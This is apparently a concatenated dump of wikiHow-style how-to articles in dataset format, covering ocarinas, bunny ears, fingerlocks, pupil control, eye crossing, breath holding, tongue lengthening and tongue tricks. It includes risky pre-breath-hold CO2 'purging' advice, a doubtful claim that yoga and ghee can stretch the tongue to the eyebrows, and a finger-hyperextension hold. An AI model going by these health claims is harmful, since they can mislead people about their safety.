There should now be a thin gap between your thumbs just a few millimeters wide. This is the sound hole — it's where you're blow air into the ocarina and also where the whistling noise will come out., Part your lips slightly (as if to say ""Oooh""). Place your lips so that the small ""o"" formed between them lines up just below your knuckles. In other words, your top lip should rest against your thumbs' knuckles and your bottom lip should be over the top half of the slit between your thumbs.

, Blow a steady stream of air into the very top part of the slit between your thumbs. In other words, you want to blow right below your thumbs' knuckles. You should hear a whistle that sounds a little like a hooting owl or a wooden train whistle if you did it right.


Do not vocalize in an attempt to make the bird call with your vocal cords (i.e., saying ""ooh"" or ""ahh"" as you blow). Blow noiselessly as if trying to get an empty bottle to whistle.

, It can be pretty difficult to get your hand ocarina to work, especially if this is your first time. If you're just getting the dry, pitch-less sound of rushing air, you're probably making one of a few common mistakes. See below:


The ""seal"" around your ocarina may not be tight enough. Try adjusting the shape of your hands to close gaps around the edges. You don't have to squeeze tight — just make sure you aren't letting any air out.
The noise hole may not be quite the right shape. Try moving your thumbs closer together to make the hole a little narrower.
You may not be blowing in the right place. Try moving your lips up and down slightly or widening the ""o"" formed by your lips. Remember, you want to blow into the top half of the slit between your thumbs.

, Letting air out of your ocarina through points other than the sound hole will affect the pitch of the whistle. A controlled way to do this is to lift the four fingers on your right hand up and down, mimicking the motions a flute player would make. Lift a maximum of two fingers at once — the more ways there are for air to escape, the harder it is to get pitches.


Note that this is difficult to do without causing your whistle to turn into an undesirable ""rushing air"" noise. You'll need to keep a good seal between your hands, lift your finger only slightly, and support the note with plenty of air. It can take as long to learn how to do this as it takes to learn how to make the whistle in the first place.

, The pitch you hear when you get a whistle out of a hand ocarina is the air between your hands vibrating. Creating a bigger or smaller space by changing the shape of your hands will let more or less air in, affecting the pitch. Just be careful to keep a tight seal between your hands so air can't leak out.


Making a bigger space (moving your hands apart) will produce a lower-pitched sound.
Making a smaller space (moving your hands together) will produce a higher-pitched sound.

, Changing the way you blow can also change the pitch of the note your ocarina makes. Try making a smaller ""o"" with your lips for a higher pitch or a larger ""o"" for a lower pitch.


Experienced harmonica players use a technique called a ""draw bend"" to change notes' pitches. You can get a similar effect by pulling your tongue to the back of your mouth as you blow to ""bend"" the tone of your note downwards. This takes practice!

Get a hairband.,
Draw out your bunny ears.,
Cut out the bunny ears.,
Attach the bunny ears to the headband.",How to Make Bunny Ears2," Another way to make paper bunny ears which will be a bit sturdier than the version with a paper headband is just to use a normal headband or hairband that you wear. Find one you don’t mind using to make your bunny ears.

, Get two pieces of A4 paper, one for each ear, and fold the paper in half horizontally. Now, starting at the fold in the paper, draw a bunny ear shape. Repeat this on the other sheet of paper in the same way, ensuring that the fold in the paper is where the base of the ear is.


You can decorate or colour in your ears now.
If you use any glitter or glue make sure you leave it to dry before moving on to the next steps.
For bigger bunny ears use A3 paper.

, Now you can cut out the ears. Keeping the paper folded in half, carefully cut along the outside of the ears, making sure you don’t cut along the fold at the bottom of the paper. This is what keeps the front and back of your ears together.


When you have cut out both ears you should have two pieces of paper.
Each one will have a normal bunny ear shape and an upside ear shape, which join at where the paper was folded.

, Wrap each ear around the headband so that the base of the ear, where the paper was folded, goes underneath the headband. You should now see how the folded paper has become the front and back of the ears. Glue the two sides of the bunny ears together to fix them to your headband.You can also glue the base of the ears to the headband to make them more secure.

Get hold of a paper plate.,
Draw the ears.,
Cut out the ears.",How to Make Bunny Ears3," You can make a very simple bunny ears hat with just a paper plate, some pens, and some scissors. First you need to find a paper plate. You might have some of these in the kitchen, but they are easily available in stores.

, When you have your plate, place it upside down on the floor. Starting from the inside edge of the crinkled rim, draw two ears in pen. You should be drawing into the middle part of the plate. The ears should stop about an inch inside the crinkled rim on the opposite side of the plate to where you started drawing.When you are happy with the basic outline, you can decorate or colour them in.
Try drawing a section inside the ears and colouring it pink.

, Now you need to carefully cut around the outside of the ears. Be sure not to cut the part where the base of the ears joins the rim of the plate. Then cut along the inside of the crinkled rim of the plate, so that just the ears are left attached to the rim.Fold up your bunny ears so they are pointing up.
Now slip on your new bunny ears hat.

Get a sturdy headband.,
Draw your bunny ears shape onto some felt or fabric.,
Twist wire to shape.,
Cut out your bunny ears.,
Cover the wire ears with fabric.",How to Make Bunny Ears4," If you decide you want to make bunny ears that are bit stronger than paper ones, you can make some from fabric or felt. For this method you will need a good sturdy headband or hairband to attach the ears to. Something like an Alice band would be a good choice.

, Place your hair band onto the felt and draw the shape of your ears directly onto the felt. You can choose whatever shape or colour you like.

, Now take a piece of 20 gauge wire and attach one end of it to your headband, and bend it into the shape of the ear you have just drawn. You should leave enough clearance, about an inch, outside the wire for you to apply glue. When the wire is bent into shape, trim it and wrap the other end around your headband.Repeat this process for the other ear.
You should have two basic wire bunny ears attached to the headband.

, Carefully cut along the outside edge of your drawn ears on the felt or fabric. You need a front and a back for each ear, so after you cut each one out, use it as a template to cut out its reverse side.You should be left with four pieces of fabric, two pairs.
You can cut out smaller pieces of fabric of a different colour to stick on as the inner ear.
Or you can decorate them however you like.

, Now lay down one of each ear piece and put the wire ear frames on top of it. It should fit easily, but you may have to bend the wire a little here and there. Then glue this bottom ear to the other piece of fabric you have cut out for each ear so that the wire is hidden inside.It’s a good idea to apply glue to the part on the inside of the wire first and stick it down.
Then glue around the edges to secure it.
Leave the glue to dry, and then you should have bunny ears that you can bend to shape.

Ask for a volunteer.,
Have the volunteer put both hands together.,
Ask the volunteer to fold their middle fingers down.,
Place a coin between the ring fingertips and ask them to move each finger.,
Enjoy the confused and amazed look of your volunteer and friends.",How to Put Someone in a Fingerlock1," Pick someone out from the group you’re in who wants to have this trick done on them.


You can assure your volunteer that this trick won’t hurt, just amaze them!
It’s possible that double-jointed people will be able to get out of this trick, so you can ask the volunteer first if he or she is double-jointed.;
, Ask your volunteer to hold his or her hands out in front of them and press both palms together.


Make sure the volunteer has his or her palms flat together with the fingertips of one hand touching the fingertips of the other.

, Have the person fold the middle finger on both hands down, so that each one is resting on the back of the opposite hand.


The middle fingers should be folded down as one would when interlacing the fingers. However, all other fingers (thumbs, pointer fingers, ring fingers, and pinky fingers) should remain unfolded with fingertips touching.
Try an alternative if you wish, which has only the ring fingers up, with all other fingers folded down., Place a coin of any kind between your volunteer’s two ring finger tips. Then ask them to separate each pair of fingertips, with the ring fingers holding the coin last.


Have the volunteer separate their thumbs. They should be able to easily.
Have the volunteer separate their pointer fingers. They should be able to easily.
Have the volunteer separate their pinky fingers. They should be able to easily.
Then have the volunteer separate their ring fingers, with the goal of letting the coin drop. They will likely struggle to move their ring fingers apart at all.

, See the shocked or frustrated face of your volunteer when he or she can’t move their ring fingers, which is surprising to most people because they can move all of their other fingers easily.


You can tell others that this trick occurs because the tendons in the hand that control the fingers are separate from one another, except for the middle and ring finger, which are controlled by the same tendon. So when one is folded down, the other can’t be lifted.If your volunteer is able to separate their fingers enough to drop the coin, try placing a bigger object between the fingers.
Also make sure that your volunteer’s middle fingers stay completely folded down to prevent them from getting out of the lock. You can even hold these fingers down for them.
You can also place something between the subject’s palms to help keep the fingers folded down and make the trick more difficult. Use an object like a thin book, a small rock, or even your own hands.

Imagine a dark room.,
Focus on distant objects, or unfocus your eyes.,
Face a darker part of the room.,
Try tensing your stomach.,
Picture something that gives you an adrenaline rush.",How to Dilate or Shrink Your Pupils on Command1," Research in 2014 showed that people can sometimes dilate their pupils by imagining dark shapes or dark scenes.Think of those black bears assaulting a black campground at midnight, and your eyes may widen temporarily.;
, Your pupils will get bigger as your eyes adjust to a further viewing distance.Another way to approach this is to suddenly unfocus your eyes, blurring your vision as much as you can. If you're doing this correctly, your eyes will feel very relaxed; if you start to see double, you've probably crossed your eyes and need to start over.


With these techniques, you won't be able to observe your own eyes, so you'll need to record yourself or have a friend watch.

, As you probably know, pupils grow to let in more light. If you aren't able to dim the surrounding lighting, you can still dilate your pupils by turning to face away from windows and light source.

, Suck your stomach in and keep the muscles tight as you watch yourself in a mirror, to see whether your pupils increase. Some people can dilate their pupils in this way, although the underlying mechanism is unidentified. If you see no change after repeated tensing and bending, move on to a different technique.

, Your pupils can dilate dramatically when you are excited, or especially when sexually stimulated, due to the release of oxytocin and adrenaline. In addition to dilated pupils, these chemicals also causes your mind to race, muscles to tense up, and breathing to go faster. Through biofeedback, people can learn to ""drive"" their adrenaline levels up or down."

Focus both your eyes on the tip of your nose.,
Move your gaze upward.,
Practice, practice, practice.,
Get help from a friend.,
Hold out a pen at eye level at arm's length.,
Bring the object closer to your face.,
Stop when the object is close to your face.,
Remove the object from your line of sight, but don't move your eyes.,
Be a master at crossing your eyes.,
Cross your eyes.,
Focus on moving just one eye away from your nose.,
Repeat with the other side.,
Keep practicing!",How to Cross Your Eyes," Slowly lower your gaze until both of your eyes are focused on the tip of your nose. This may cause a bit of an eye strain, since you're probably not used to using your eye muscles this way. Though you won't be able to see it yourself, your eyes should now be crossed. But this is no fun so far -- since you're looking down, no one else can see that your eyes are crossed.






;
, This part is tricky. Once you've mastered looking at the tip of your nose, you should slowly move your gaze upward, as if you were staring straight ahead, while trying to keep your eyes angled inward, just as they were when you were concentrating on staring at the tip of your nose.








, You will probably find it difficult to keep your eyes crossed once you stop focusing on your nose. Crossing your eyes is a very natural technique that allows you to focus on something that is very near you, and as soon as you bring your eyes away from that object (in this case, your nose), your brain will automatically try to refocus your eyes on more distant objects, thereby uncrossing your eyes almost immediately. You can, however, control your eye muscles to stay out of focus, but it may take some practice. Don't forget to keep your eyes open, so anyone can see your cross-eyed face!








, If you really want to master eye crossing, then you should have a friend there to watch you do it, so you can make sure you're really doing it successfully. If you look up at your friend and the friend says, ""Ew!"" or makes a gross face, then chances are that yeah, you've successfully crossed your eyes. People say you can try taking a picture of yourself in the cross-eyed position to see if you've done it successfully, but that just takes way too much coordination.








, Focus on that object, trying to ignore everything behind it. This is really another version of staring at the tip of your nose, which exaggerates the process and makes it just a bit easier.








, Do this slowly, and make sure to keep your focus on that object only. This will take some practice. Don't get frustrated if you can't seem to keep your gaze on the object, at first.








, Once the pen is about 2–4 inches (5.1–10.2 cm) from your face, your eyes should cross. Take a moment to continue to focus on the object with your eyes crossed.








, This part is tricky. As with the technique above, keeping your eyes crossed is the hard part, but it can be achieved with practice. You'll know when your eyes ""uncross"" because your eyes will seem to ""snap"" back into focus.








, This is an advanced skill you can master only after being a pro at crossing your eyes the regular old way. Crossing your eyes while moving one eye at a time has an extra gross-out factor, because, if you do it successfully, you'll be able to move your eyeballs in different directions.








, Just use whatever technique works best for crossing your eyes, whether it's looking at the tip of your nose and then looking up, using a pen, or doing whatever works for you.








, While your eyes are crossed, focus on, say, moving your right eyeball all the way out to the left side of your face. At first, it should at least get to the middle. As you do this, make sure to keep the left eye crossed, focusing on the tip of your nose. This will create a disturbing look, with one eye crossed all the way, and the other either facing out or even to the side.








, You may have more control of one eye than the other, so you should try the opposite, keeping your right eye crossed while moving your left eye to the center or all the way to the left corner of your eye. See which one is easier for you.








, This is an even harder skill than crossing your eyes, but if you master it, it is guaranteed to freak out your friends even more. Take just a few minutes a day to practice this skill and you'll be a champ in no time.

Practice deep breathing.,
Purge the CO2 from your lungs.,
Take a breath and hold it for one minute and thirty seconds.,
Repeat the process of deep breathing and purging, then hold your breath for two minutes and thirty seconds.,
Splash cold water on your face.,
Take a breath and hold it for as long as possible.,
Relax every muscle in your body.,
Exhale slowly.,
Repeat these steps 3-4 times per session.",How to Hold Your Breath for Long Periods of Time1," Before holding your breath, inhale and exhale slowly from deep within your diaphragm. By doing this, you're ridding your lungs of low-quality air.Spend five seconds breathing in, then hold the breath for one second, before breathing out for ten seconds. Continue deep breathing for two minutes, and be sure that when you exhale, you push out every last ""drop"" of air.


As you exhale, push your tongue up against your teeth.This forms a valve which helps to control the release of air. Your breath should make a hissing sound as it is released.Deep breathing allows your body to take in excess oxygen, which it can then store in the blood cells. This helps when holding your breath as your body can use the stored oxygen to continue functioning, even when you are not breathing.;
, When holding your breath, the pressure you feel in your lungs is not the result of a need to breathe, but rather the result of a build-up of CO2, fighting to be released. This build-up of CO2 becomes increasingly painful as time goes on. To minimize this build-up, it is necessary to purge any pre-existing CO2 from your lungs, before holding your breath. To do this:


Exhale forcefully, pushing as much air out of your lungs as possible. Puff out your cheeks as you do this, and imagine you are trying to blow a toy sailboat across a stretch of water.Once you have exhaled completely, inhale quickly and repeat. Try to keep your body as still as possible while you do this, to avoid expending any of the stored oxygen from the previous step.

, This is a practice run which will allow your body to adjust to the sensation of going without air. Use a timer to count down the 90 seconds, and don't attempt to hold your breath for any longer just yet.


When you inhale, don't breathe in so much that you're about to pop; this creates tension in your body and causes you to expend more energy. Instead, fill your lung capacity to about 80-85% capacity so that you still have room to relax.
Once the 90 seconds is up, exhale briefly to rid your lungs of the used air, then take three breaths, inhaling and exhaling fully. This is known as semi-purging.

, Once the first 90 second practice run is up, repeat the deep breathing and purging exercises. Perform each exercise for a duration of one minute and thirty seconds.


Once this is done, take a breath and hold it for two minutes and thirty seconds, timing it on a stopwatch. Do not attempt to hold your breath for any longer than this.
Once the time is up, exhale to release the used air and take three semi-purge breaths. Follow this with two minutes of deep breathing and a minute and a half of purging. You are now ready to try holding your breath for as long as possible.

, At this point, you may decide to splash your face with some cold water before attempting to hold your breath. It has been observed that putting a person's face in contact with cold water triggers bradycardia, or the slowing of the heart rate, which is the first phase of the mammalian diving reflex.However, this step is purely optional.


You don't need to actually put your entire head underwater, though. Just splash some cold water on your face right before you hold your breath, or try using a cold, wet washcloth.
Don't use an ice pack instead of water, though; the same study suggests that the shock of something too cold triggers other reflexes. Just make sure the water is at a temperature of approximately 70 °F (21 °C) and that the rest of your body is in a relaxed position.

, Assume a comfortable seated position and take a deep breath, filling your lungs to about 80-85% of capacity. Hold your breath for as long as possible, staying completely still to avoid expending unnecessary energy and wasting oxygen. It is usually better to have someone else timing your progress, as time will pass more quickly and you will be able to hold your breath for longer if you are not constantly watching the clock.Holding your breath for long periods of time can be painful, and it usually necessary to find a way to distract yourself if you are to successfully achieve your goal. One popular distraction technique is to move through the alphabet from A to Z, thinking of a friend, celebrity or historical figure whose name begins with each letter. Aleix Segura Vendrell, who set a world record for holding his breath underwater for 24 minutes and 3 seconds, is a proponent of this very technique.Don't hold air in your cheeks. This method is meant for an air reserve, which requires ""letting go"" of the air in your lungs and switching it with the air in your cheeks. This is known as ""circular breathing"" and can be very difficult to achieve, usually resulting in the breath-holder losing both air reserves. Therefore, it may be best to avoid this method for the time being.

, It is vital that you relax completely and release any tension from your body as you hold your breath. Close your eyes and focus on releasing the tension from each body part in turn, starting with your feet, and moving slowly upwards along your body, all the way up to your neck and head. By doing this, it is possible to significantly lower your heart rate and increase the time you are able to hold your breath for.Concentrate on something that's relaxing to you. When you can't concentrate anymore, distract yourself by doing something with your hands, like counting to 99 with your fingers.

Try not to move during any point when holding your breath. When you move, you waste oxygen and that will cut down the time you're able to go without breathing. Stay still.

, When you can't hold your breath anymore, try to avoid exhaling all the air in your lungs in a mad rush. First, exhale about 20% of your air, then inhale again so that oxygen gets to your most critical areas faster. Then you can exhale and inhale completely.

, It is not recommended to do this any more, as it could damage your lungs and body. Try one session in the morning and one session at night if you wish. Keep practicing and before you know it, you will be able to hold your breath for several minutes.

Understand the basics of Kechari Mudra yoga.,
Begin practicing Kechari Mudra.,
Seek the guidance of an advanced yogi.",How to Get a Longer Tongue1," Kechari Mudra is an advanced yoga practice in which the practitioner uses their tongue to strengthen their body and raise their level of consciousness.The idea with Kechari Mudra Yoga is to slowly increase the length of the tongue until it’s eventually long enough to enter and stimulate certain areas in the nasal cavity.


With continued practice, Kechari Mudra may also help the practitioner fight diseases and lower their breathing rate.;
, While sitting in a comfortable position, roll your tongue up to touch your upper palate. See how far back your tongue is able to go. You may only be able to touch your hard palate when first starting out.


Hold your tongue back until you start to feel pain, then rest your tongue in its normal position.
As you continue practicing Kechari Mudra Yoga, your tongue should stretch and reach further back towards your uvula.
After you gain some confidence, you can practice Kechari Mudra while engaging in light activities.

, In the final stages of Kechari Mudra, your tongue should be long enough to go behind your uvula and up into your nasal cavity. You’ll reach this stage more safely and successfully with the help of an expert yogi to assist you in your practice.


Your guide may recommend the application of butter or ghee to draw out and lengthen your tongue. At this point, your tongue should be long enough to reach the center of your eyebrows.
Even with a guide, Kechari Mudra may take months or years to master.

Ask your volunteer to lift fingertips from the table.,
Have your volunteer attempt to lift their ring finger.",How to Put Someone in a Fingerlock2," Ask anyone in a group if they’d like to perform a fun trick with their hand.


Let any potential volunteers know that the trick isn’t dangerous and won’t hurt. It’s just fun and surprising.
Make sure you and your volunteer have access to a table or other nearby flat surface before performing the trick.

, Ask your volunteer to put either of their hands onto a flat surface, but with the middle finger folded underneath.The back of the middle finger and the fingertips of all other fingers should be resting against the table or flat surface. Your volunteer’s hand should remain in this position.

, Instruct your volunteer to lift each fingertip off of the table, with the ring finger last.


Have them lift first their thumb, then pointer finger, then pinky finger from the surface of the table. They should be able to move each of these with ease.

, Ask your volunteer to lift their ring finger from the table last, which they are very likely not to be able to do.


Enjoy the surprise and amusement of your volunteer and other guests. Have others try the same trick themselves if they don’t believe it. Try on both right and left hands as well.
You can tell your audience that the trick works because the middle and ring finger are controlled by the same tendon in the hand, so one cannot easily be lifted when the other is folded. The other fingers are controlled by separate tendons so they can be moved independently.Make sure that anyone trying the trick keeps their middle finger folded under and that this finger and all other fingertips remain flat on the table.

Grab your opponent’s wrist.,
Grab and bend the fingers.,
Try a thumb compression lock.",How to Put Someone in a Fingerlock3," Secure either of your opponent’s wrists when grappling to begin the finger lock.


Make this move when grappling rather than striking, as both of your hands will be occupied with this move, leaving you open for a strike.It is typical to secure the wrist with your non-dominant hand, as you will want to perform the finger lock itself with your dominant hand.

, Take hold of one or more fingers on the hand of your opponent that you’ve secured. Bend fingers so that they are hyperextended outside their range of motion.


Lock fewer fingers (just one or two) to make this move more painful, and thereby more effective for subduing an opponent.
Try pulling the fingers backward toward the knuckles, or bending and twisting them sideways., Push the thumb of your opponent’s hand in toward the palm to perform the finger lock on the thumb.


Curl the thumb as much as possible and pin the tip of the thumbnail down tightly against the palm for the greatest effect.Perform the thumb compression if you cannot grab the other fingers, or the thumb is more accessible to you.

Use allergy eye drops.,
Drink an espresso or take decongestants.,
Consider 5-HTP supplements.,
Avoid other substances unless recommended by a doctor.",How to Dilate or Shrink Your Pupils on Command2," Pick up some over-the-counter eye drops intended to be used to treat allergies. These can cause your eyes to become dilated. Be sure to read the instructions, and never use more drops than the label recommends.

, Stimulants that work on the sympathetic nervous system can trigger your iris muscles to dilate your pupils. These include caffeine, ephedrine, pseudoephedrine, and phenylephrine. The last three are found in most over-the-counter decongestants.

, This is an over-the-counter drug you can find at pharmacies or anywhere that sells health supplements. While 5-HTP is generally safe, too high a dosage can cause dangerous effects from ""serotonin syndrome.""Stick within the recommended dosage, and avoid 5-HTP entirely if you are on LSD, cocaine, antidepressants, large B-vitamin doses, or other substances that increase serotonin levels., Some prescription eye drops can dilate pupils, but have serious side effects that should be weighed by a doctor. If you are going through methadone treatment or have a medical condition that constricts your pupils, ask your doctor for advice on how to counteract this.


Some recreational drugs cause dilated pupils as well. These are illegal in most areas, and can come with additional health risks if combined with other substances that cause dilated or constricted pupils.

Look at a bright, natural light.,
Focus intently on something close to you.,
Consider medication.",How to Dilate or Shrink Your Pupils on Command3," Stare at a bright window for a couple seconds. This will cause your pupils to shrink immediately. If you're outside, step into a patch of sunlight, rather than staying in the shadows.


While light bulbs will work as well, natural light is more effective.
Never look directly at the sun, as this could damage your eyes.

, Your pupils will narrow as you change your focus to something in front of your face. You can start by closing one eye and placing your finger in front of the open one. With practice, you can learn to focus your eyes close even when there's nothing there.

, There are a variety of medications used to constrict the pupil, but these are usually only available as a prescription, or even administered by the doctor only.


Opiates constrict pupils, but most examples are illegal in most countries. They can also cause serious harm, especially when combined with other drugs that cause pupil constriction or dilation.

Take up a wind or brass instrument.",How to Hold Your Breath for Long Periods of Time2," While there is no way to increase your lung size, there are many ways to increase the amount of air your lungs take in, and the efficiency with which they capture oxygen. In particular, a rigorous exercise routine can help to strengthen your lungs and maximize their capacity to hold air.



Do plenty of cardio. Incorporating some intense cardio workouts into your weekly routine can do wonders for your lungs. Running, skipping, aerobics and swimming are all great forms of cardiovascular exercise which get the blood pumping and the lungs working hard to supply the body with the oxygen it needs to keep going. Try doing exercising in intense 30 minute bursts, pushing your body to its limits, to achieve the best result.

Exercise in water. Exercising in water (swimming, water aerobics, underwater weight training) is also a form of cardio exercise, but the water provides an element of resistance which requires the body to work harder to complete each task. As a result, the lungs need to work harder to supply the body with oxygen, causing their air capacity to increase significantly over time.

Work-out at high elevation. At higher elevations, there is less oxygen in the air, meaning your lungs have to work harder to supply the body with oxygen. This is an excellent way to strengthen the lungs, but you must be careful not to train to hard, or you could potentially fall victim to altitude sickness.

, Any excess baggage reduces your body's efficiency in using oxygen, as there is increased body mass to which your blood must pump oxygen.As a result, many competitive breath holders will attempt to shed any extra pounds in the weeks coming up to a competition.


This weight loss should be achieved in a strictly healthy way - through exercise and balanced diet - as weakening your body through crash dieting will negatively impact your ability to hold your breath.
The world record breath holder, Aleix Segura Vendrell, is reported to have lost weight for 4 months before attempting to beat the world record for holding breath underwater, in an effort to improve his ratio of body volume to lung volume., The fact that smoking has a negative impact on lung strength and capacity is common knowledge. Quitting can considerably increase your lungs' ability to release carbon dioxide and absorb oxygen, even withing a matter of weeks. So if you are trying to strengthen your lungs and increase their capacity, giving up smoking is undoubtedly the first thing on the to-do list.


You should also try to avoid second-hand smoke as far as possible, as inhaling someone else's cigarette smoke can have a negative effect on your lungs.

, These types of instruments require plenty of lung power, making them a great way to improve lung strength and increase your ability to control your breathing. And aside from that, playing an instrument is a fantastic life skill, which can provide immense personal satisfaction.


The flute, clarinet, oboe and saxophone are all good options when it comes to wind instruments, while the trumpet, trombone and tuba are popular brass options.
If you have a good voice, singing is another great musical aid to improving lung power. Singing requires immense control of one's breathing, making it an excellent complimentary activity for aspiring breath-holders.

Always practice with a partner.,
Practice sitting up, rather than lying down.,
Do not attempt to do this underwater, unless supervised by a professional.",How to Hold Your Breath for Long Periods of Time3," It is highly advisable that you practice holding your breath with a partner. The main reason for this is that they can ensure your safety if you happen to pass out (which is fairly common during limit-testing training sessions), preventing you from hurting yourself and taking care of you while you recover your senses. In addition, a partner can help to time your breath-holding sessions, notifying you at each 30 second interval.

, The best position to practice holding your breath in is sitting upright in a comfortable position, such as on a sofa or armchair. This allows you to expend as little energy as possible while holding your breath. It is not advised that you lie down while holding your breath, as you run the risk of choking on your tongue if you happen to pass out.

, Although the purpose of learning to hold your breath for longer is usually for use underwater, you should never do underwater training alone, without supervision. As mentioned before, it is quite common for people to black out or lose consciousness after holding their breath for prolonged periods, and if this happens underwater it can lead to drowning.


Even practicing with a partner can be dangerous, as an untrained eye may be unable to tell the difference between someone who is holding their breath and someone who has passed out.
If you do decide to practice with a partner, make sure that you decide on a hand signal which you can give at regular intervals to indicate to your partner that you are okay."

Decide whether or not surgery is the best option.,
Undergo lingual frenectomy surgery.,
Undergo lingual frenuloplasty surgery.,
Understand potential complications following surgery.,
Perform tongue exercises.",How to Get a Longer Tongue2," Tongue-tie, or ankyloglossia, is a disorder which restricts the movement of the tongue and makes it difficult for the sufferer to stick his or her tongue out of their mouth. With ankyloglossia, the band of tissue connecting the tip of the tongue to the floor of the mouth (lingual frenulum) is abnormally short resulting in oral complications.You should consider surgery if you or your child have restricted tongue movement due to ankyloglossia.


Ankyloglossia affects more than speech. A person with the condition may also experience problems with oral hygiene, dental health, eating, digestion and sexual function.
Ankyloglossia can be caused by environmental or genetic factors.
Tongue-tie surgery can be performed on children, infants or adults.
Ankyloglossia can negatively affect the ability of an infant to breastfeed.
If you’re the parent of a child with ankyloglossia, surgery is often the best option. In most cases, the lingual frenulum will not stretch or break on its own.

, A lingual frenectomy is the most common procedure performed when the lingual frenulum results in restricted tongue movement. This is a relatively simple procedure in which an oral surgeon uses a pair of sterilized scissors to completely remove the lingual frenulum.


A lingual frenectomy is a short, 10-15 minute operation usually performed with local anesthesia.There aren’t many blood vessels in the lingual frenulum, so discomfort should be minimal during the procedure.

, A lingual frenuloplasty is performed when the lingual frenulum is too thick or additional repair is needed after a lingual frenectomy. A lingual frenuloplasty is a more exact surgery which aims to alter the lingual frenulum without completely removing it.


The goal of lingual frenuloplasty is the same as a lingual frenectomy procedure; both surgeries aim to increase the tongue’s length and range of motion.
A lingual frenuloplasty is done under general anesthesia. Surgical tools are used, and the oral surgeon uses stitches on the resulting wound.

, Postoperative complications associated with a lingual frenectomy and frenuloplasty aren’t usually serious but can include infection, bleeding and nerve damage. Because lingual frenuloplasty surgery is more involved, there are additional risks of scarring and negative reactions to anesthesia.


Both surgeries can be performed using a scalpel or laser. If you have laser surgery to correct your ankyloglossia you won’t need stitches and there is usually less pain and bleeding after surgery.

, Tongue exercises should be performed after surgery to further develop tongue’s muscles, length and range of motion.These exercises include:


Stretching your tongue up to your nose and down to your chin. Repeat this exercise three or four times.
Moving your tongue back and forth across the outside of your top lip.
Closing your mouth and moving your tongue between your right and left cheeks.
Moving your tongue in and out of your mouth several times.

Learn the reverse T. This trick uses some of the same movements as the clover.",How to Do Tongue Tricks," Rolling your tongue into a tube is one of the most common tongue tricks. To do this, roll the outer edges of your tongue up and around so that edges of your tongue touch each other. Stick your tongue out of your lips to keep the tube shape.


To get the edges of your tongue to meet, push the edges upwards with your fingers from underneath. Make an ""O"" with your lips, and hold your tongue in the shape. Do this until you can roll your tongue without the aid of your fingers.
Another way to make the shape with your tongue is to pull the middle of your tongue muscle down. This should pop the sides of your tongue upwards. Try to catch the edges of your tongue along the edges of the roof of your mouth. Then, push your tongue out between your lips while holding the shape.
This is also called making a taco, a tongue roll, or a loop.
65-81% of people can roll their tongues; females are more likely to than males. Recent research has started to debunk the myth that tongue rolling is a genetic trait. Several studies in children showed that tongue rolling can be learned.;
, For this trick, you are basically folding your tongue in half. Start by placing the tip of your tongue behind your teeth. Push forward with your tongue, keeping the tip of your tongue in place. It should fold in half.


Open your mouth wider as you complete this. It helps you see how your tongue has been folded over.

, Turn your tongue over in your mouth. Either turn clockwise or counterclockwise, whichever is more comfortable for you. Press your tongue against your bottom teeth while using your top teeth to press the tongue flat. Poke the tip of your tongue out from your lips. You should see the bottom of your tongue.


To help train your tongue to do this, use your fingers. Take your tongue and turn it over. Hold it there. Let it go, and try to work up to being able to hold your tongue there without any help.

, This trick might be difficult depending on the length of your tongue and the length of your nose. Start by sticking your tongue out. Point the tip of your tongue upwards. Stretch your tongue as far as you can towards your nose.


For some people, it might be helpful to pull your top lip over your teeth. For others, it might be helpful to stretch your top lip as close against your teeth as possible above the teeth near the gumline. This gets it out of the way so your tongue doesn't have as far to travel.
Try flattening your tongue as you stretch it upwards. This might give you a better stretch than keeping your tongue pointed.
As you work on stretching your tongue to touch your nose, use your finger to guide it towards your nose.

, This simple trick only requires you to make a depression with your tongue. Start with your tongue flat and your mouth open. Pull the middle of your tongue down while the edges curl upwards. Curl the tip of your tongue inwards. This should make a round edge to your tongue that looks like a spoon.


When you are finished with this trick, your tongue will be out of your mouth. The bottom of your tongue will be pressing against your bottom lip.
If you are having trouble getting the round shape, try making a roll with your tongue at first. Then lift up your tip. Or try using your finger to make a depression in the middle of your tongue., This simple trick relies on lip placement. Cover both your lower and upper teeth with your lips. Press your tongue as flat against the roof of your mouth as possible. Make sure the edge of your tongue can be seen past your lips. The spaceship is made by the round edge of your tongue and the thin line of the skin below.


If you're struggling to get the right form, get your tongue into position against the roof of your mouth before moving your lips.
Use your finger to help you push your tongue into position if you can't get it to press against the roof of your mouth., The clover leaf builds off the tongue roll. Roll your tongue into a tube. Then, pull the tip of your tongue back. As you pull it back, press the bottom of your tongue against the inside of your lower lip.


To complete this, you may have to stretch your lips wide. Turn them down slightly to get enough tension to press again. This also gives you enough space to see your tongue.
Use your fingers while you are learning. Roll your tongue into a tube. Place your fingers about a centimeter apart under your tongue. Pinch together the tip of your tongue. This helps your tongue start to learn the formation of the clover leaf., This trick gives the illusion of two separate ends of a tongue. Start with your tongue flat and slightly sticking out of your lips. Slide your tongue into your mouth, and put the tip of your tongue behind your teeth. Pull the middle of your tongue down so that the edges pop up. Close your lips around your tongue so that the only thing showing is two sides of your tongue.


Use your finger to push down the middle of your tongue if it keeps popping into view. The trick is to have only the two sides visible.
You can also achieve this by rolling your tongue. Roll your tongue into a tube. Push the edges of the tongue nearest to the lips past the lips. The rolled shape helps keep the rest of the tongue out of sight., Start with the tip of your tongue behind your bottom teeth. Push the middle of your tongue down while pushing forward. This should create a fold along your tongue just above your teeth. Paired with the line down the center of your tongue, this crease makes an upside down T."

Find a cold air source.,
Take a deep breath.,
Exhale.",How to Blow Smoke from Your Mouth Without Using a Cigarette1," Using cold air will help you create water vapor from your mouth, which will appear to be smoke. If it is winter, use the cold air outside, or use the cold air coming from your freezer.


Using winter air is easy to do, but because many people know how to do this, it's not a very clever way to produce smoke. Try to use a freezer if possible because it will give you a more exciting effect. Keep in mind that because the source of cold air from the freezer is smaller, smoke may be harder to produce or be more difficult to see.;
, Open your freezer and inhale deeply. Try to place your face as far in your freezer as possible so that you can inhale the most cold air. If you are outside, just inhale the cold air around you.








, After you have taken a deep breath of cold air, breathe out through your mouth. You will need to do this in a cold setting, so don't remove your face from the freezer. The combination of your warm breath on a cold surface or in a cold area is what causes the visible smoke.








For a more visible, lasting effect of smoke, try blowing on a piece of glass. After you have inhaled the cold air, exhale directly onto the glass. This glass will need to be very cold as well so that the difference of temperatures between the cold glass and your warm breath will create the effect of smoke. After blowing on the glass, the cloud of smoke you have produced will condense onto the glass, making it last longer than if breathed into the air.
